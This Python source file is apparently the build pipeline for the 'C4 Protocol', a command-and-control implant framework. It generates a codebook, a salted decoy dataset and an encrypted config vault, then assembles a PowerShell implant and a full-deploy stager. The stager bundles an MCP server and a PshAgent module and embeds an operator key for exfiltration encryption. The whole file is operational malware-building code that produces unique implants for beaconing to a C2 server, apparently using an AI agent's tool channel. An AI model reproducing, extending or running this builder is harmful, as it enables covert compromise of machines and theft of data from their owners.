#!/usr/bin/env python3
"""
Master pipeline: codebook → dataset → config → assemble → stager.
This is the math-free version of the C4 Protocol using an Encrypted Vault.

Each run produces a unique implant instance under implants/<implant-id>/ with its
own codebook, salt, config, and stager.  The C2 server uses the implant ID
(received in beacons) to look up the correct directory for key/codebook lookup.
"""

import argparse
import base64
import shutil
import subprocess
import sys
import time
import uuid
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.panel import Panel

console = Console()

# Base directory
DIR: Path = Path(__file__).parent

StepDef = dict[str, Any]


def _make_steps(instance_dir: Path) -> dict[str, StepDef]:
    """Build step definitions targeting a specific instance directory."""
    return {
        "codebook": {
            "script": "build/generate_codebook.py",
            "description": "Generate codebook from implant_actions.yaml",
            "args": lambda a: [
                "--actions",
                str(DIR / a.actions),
                "--output",
                str(instance_dir / "codebook.yaml"),
                "--tool-codes",
                str(a.tool_codes),
                "--param-codes",
                str(a.param_codes),
                "--seed",
                str(a.seed),
            ],
        },
        "dataset": {
            "script": "build/generate_dataset.py",
            "description": "Generate testing dataset with salt",
            "args": lambda a: (
                [
                    "--codebook",
                    str(instance_dir / "codebook.yaml"),
                    "--output",
                    str(instance_dir / "dataset.json"),
                    "--num-examples",
                    "1000",
                    "--num-decoys",
                    "100",
                    "--salt-file",
                    str(instance_dir / "salt.txt"),
                    "--seed",
                    str(a.seed),
                ]
                + (["--public-key", str(DIR / a.public_key)] if a.public_key else [])
            ),
        },
        "config": {
            "script": "build/export_config.py",
            "description": "Export encrypted configuration vault",
            "args": lambda _a: [
                "--codebook",
                str(instance_dir / "codebook.yaml"),
                "--value-codebook",
                str(DIR / "value_codebook.yaml"),
                "--salt-file",
                str(instance_dir / "salt.txt"),
                "--output",
                str(instance_dir / "config.enc"),
            ],
        },
    }


STEP_ORDER: list[str] = ["codebook", "dataset", "config", "assemble", "stager"]


def format_size(size_bytes: float) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if size_bytes < 1024:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024
    return f"{size_bytes:.1f} TB"


def format_duration(seconds: float) -> str:
    if seconds < 60:
        return f"{seconds:.1f}s"
    minutes = int(seconds // 60)
    secs = seconds % 60
    return f"{minutes}m {secs:.1f}s"


def run_step(name: str, step_def: StepDef, args: argparse.Namespace) -> None:
    script: Path = DIR / step_def["script"]
    cmd: list[str] = [sys.executable, str(script)] + step_def["args"](args)
    console.rule(f"[bold cyan]{name}[/] — {step_def['description']}")
    console.print(f"[dim]$ {' '.join(cmd)}[/]\n")
    start: float = time.time()
    result = subprocess.run(cmd)
    elapsed: float = time.time() - start
    if result.returncode != 0:
        console.print(f"\n[bold red]FAILED[/] {name} (exit code {result.returncode})")
        sys.exit(result.returncode)
    console.print(f"\n[green]✓[/] {name} completed in {format_duration(elapsed)}\n")


def assemble_ps1(args: argparse.Namespace, instance_dir: Path) -> None:
    console.rule("[bold cyan]assemble[/] — Assemble self-contained PS1 scripts")
    config_path = instance_dir / "config.enc"
    if not config_path.exists():
        console.print(f"[bold red]MISSING[/] {config_path}")
        sys.exit(1)

    start = time.time()
    # Encrypted config is already binary, just base64 it
    raw_config = config_path.read_bytes()
    b64 = base64.b64encode(raw_config).decode("ascii")

    # Load operator public key
    if args.public_key:
        pubkey_path = DIR / args.public_key
        pubkey_b64 = base64.b64encode(pubkey_path.read_bytes()).decode("ascii")
        console.print(
            f"[dim]  Operator key: {pubkey_path.name} ({format_size(pubkey_path.stat().st_size)})[/]"
        )
    else:
        pubkey_b64 = ""
        console.print(
            "[yellow]  WARNING: No --public-key provided. Exfil encryption will be disabled.[/]"
        )

    console.print(
        f"[dim]  Vault Size: {format_size(len(raw_config))}  Base64: {format_size(len(b64))}[/]"
    )

    targets = [
        ("c4-implant.ps1", DIR / "runtime" / "c4-implant.ps1.template"),
    ]

    for name, template_path in targets:
        output_path = instance_dir / name
        template = template_path.read_text()
        output = template.replace("__VAULT_B64__", b64)
        output = output.replace("__OPERATOR_PUBKEY__", pubkey_b64)
        output_path.write_text(output)
        console.print(f"[dim]  {name} ({format_size(len(output))})[/]")

    elapsed = time.time() - start
    console.print(f"\n[green]✓[/] assemble completed in {format_duration(elapsed)}\n")


def assemble_stager(
    args: argparse.Namespace, instance_dir: Path, implant_id: str
) -> None:
    console.rule("[bold cyan]stager[/] — Assemble full-deploy RC stager")
    start = time.time()

    mcp_server = DIR / "runtime" / "mcp_server.py"
    implant = instance_dir / "c4-implant.ps1"
    pshagent_dir = (
        Path(args.pshagent_dir) if args.pshagent_dir else DIR.parent / "PshAgent"
    )
    template = DIR / "stager" / "rc_stager_full.ps1.template"
    output = instance_dir / "rc_stager_full.ps1"

    for label, path in [
        ("MCP server", mcp_server),
        ("Implant", implant),
        ("PshAgent", pshagent_dir),
        ("Template", template),
    ]:
        if not path.exists():
            console.print(f"[bold red]MISSING[/] {label}: {path}")
            sys.exit(1)

    cmd: list[str] = [
        sys.executable,
        str(DIR / "build" / "assemble_stager.py"),
        "--mcp-server",
        str(mcp_server),
        "--implant",
        str(implant),
        "--pshagent-dir",
        str(pshagent_dir),
        "--template",
        str(template),
        "--output",
        str(output),
        "--implant-id",
        implant_id,
    ]
    console.print(f"[dim]$ {' '.join(cmd)}[/]\n")
    result = subprocess.run(cmd)
    if result.returncode != 0:
        console.print(f"\n[bold red]FAILED[/] stager (exit code {result.returncode})")
        sys.exit(result.returncode)

    # Copy operator public key into instance dir for C2 lookup
    if args.public_key:
        pubkey_src = DIR / args.public_key
        if pubkey_src.exists():
            shutil.copy2(pubkey_src, instance_dir / pubkey_src.name)

    elapsed = time.time() - start
    console.print(f"\n[green]✓[/] stager completed in {format_duration(elapsed)}\n")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="C4 Protocol master pipeline (Math-free)"
    )
    parser.add_argument("--step", choices=STEP_ORDER, help="Run only this step")
    parser.add_argument(
        "--actions", default="implant_actions.yaml", help="Actions YAML input"
    )
    parser.add_argument("--tool-codes", type=int, default=50, help="Codewords per tool")
    parser.add_argument(
        "--param-codes", type=int, default=100, help="Codewords per parameter"
    )
    parser.add_argument(
        "--seed",
        type=int,
        default=None,
        help="Random seed (default: random per instance)",
    )
    parser.add_argument(
        "--public-key", default=None, help="Path to X25519 public key file"
    )
    parser.add_argument(
        "--pshagent-dir",
        default=None,
        help="Path to PshAgent module directory (default: ../PshAgent)",
    )
    args = parser.parse_args()

    # Generate implant ID: adjective-noun prefix + shortened UUID
    from coolname import generate_slug

    full_uuid = uuid.uuid4()
    short_hex = full_uuid.hex[:12]  # 48-bit suffix
    implant_id = f"{generate_slug(2)}-{short_hex}"
    if args.seed is None:
        args.seed = full_uuid.int % (2**31)

    instance_dir = DIR / "implants" / implant_id
    instance_dir.mkdir(parents=True, exist_ok=True)

    steps_defs = _make_steps(instance_dir)

    console.print(
        Panel(
            f"[bold]C4 Protocol Pipeline (Encrypted Map Version)[/]\n"
            f"[dim]Implant ID:[/] {implant_id}\n"
            f"[dim]Instance:  [/] {instance_dir}\n"
            f"[dim]Seed:      [/] {args.seed}",
            border_style="cyan",
        )
    )

    if args.step:
        steps = [args.step]
    else:
        steps = STEP_ORDER

    pipeline_start: float = time.time()
    for name in steps:
        if name == "assemble":
            assemble_ps1(args, instance_dir)
        elif name == "stager":
            assemble_stager(args, instance_dir, implant_id)
        else:
            run_step(name, steps_defs[name], args)
    pipeline_elapsed: float = time.time() - pipeline_start

    console.rule("[bold green]Pipeline complete[/]")
    console.print(f"[dim]Total time: {format_duration(pipeline_elapsed)}[/]")
    console.print(f"[bold]Instance:[/] {instance_dir}")


if __name__ == "__main__":
    main()
